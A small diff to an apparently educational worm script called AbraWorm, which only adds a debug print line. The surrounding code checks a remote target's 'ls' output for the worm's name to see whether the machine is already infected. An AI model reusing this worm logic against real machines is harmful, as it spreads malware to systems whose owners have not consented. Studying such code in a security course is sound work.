@@ -99,6 +99,7 @@ while True:
                         print(error)
                     received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                     print("\n\noutput of 'ls' command: %s" % str(received_list))
+                    print("Debug")
                     
                     if ''.join(received_list).find('AbraWorm') >= 0: 
                         print("\nThe target machine is already infected\n")      
